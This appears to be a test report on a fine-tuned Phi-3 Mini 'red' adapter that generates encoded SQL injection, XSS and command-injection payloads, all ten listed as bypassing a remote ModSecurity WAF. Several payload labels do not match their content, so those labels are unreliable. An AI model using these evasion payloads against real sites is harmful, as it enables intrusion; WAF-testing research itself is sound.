# Phi3 Mini - Remote ModSecurity WAF Test

**Date:** 20251207_215418

**Remote WAF:** http://modsec.llmshield.click

**Test Configuration:**
- Adapters: 4
- Test cases per adapter: 10
- Total tests: 40

## Results Summary

| Adapter | Phase | Passed | Failed | Bypass Rate |
|---------|-------|--------|--------|-------------|
| Phi3_Mini_Phase3_Enhanced | 3 | 10/10 | 0 | 100.0% |

## Detailed Results

### Phi3_Mini_Phase3_Enhanced

**Base Model:** microsoft/Phi-3-mini-4k-instruct

**Adapter Path:** experiments/red_phase3_lightweight_enhanced_phi3/checkpoint-314

**Phase:** 3

**Passed (10):**
- [1] SQLI: Boolean OR 1=1
  - Payload: `%2527%2520or%25201%253D1%2520--&1`
- [2] SQLI: UNION SELECT
  - Payload: `%2527%2520OR%25201%253D%2528SELECT%25201%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--%2520%2526%2526%2526%25201%253D1--`
- [3] SQLI: Time-based blind
  - Payload: `%2527%2520UNIon%2520sEleCt%25201%252cUsEr%2528%2529%252c3--%2520`
- [4] XSS: Script tag injection
  - Payload: `%253CsCriPT%253EALERT%25281%2529%253C/SCRIPT%253E`
- [5] XSS: Event handler
  - Payload: `%253cIFRAME%2520oNLOAD%253d%2527sTRING.FROMcHARcODE%252897%252c108%252c101%252c`
- [6] XSS: DOM-based XSS
  - Payload: `%253cA%2520oNFOCUSIN%253d%2522ALERT%25281%2529%2522%253e%253c%252fA%253e`
- [7] OS_INJECTION: Command injection
  - Payload: `%253B%2520ls%2520-lA`
- [8] OS_INJECTION: Path traversal
  - Payload: `%2525253B%25252520ping%25252520-c%252525201%25252520127.0.0.1`
- [9] SQLI: Error-based extraction
  - Payload: `%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520&B=C`
- [10] XSS: Polyglot payload
  - Payload: `%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253Cimg%2520sRC%253DX%252509oNlOAD%253DaLErT%25281%2529%253E%253C%252Fimg%253E%253C`

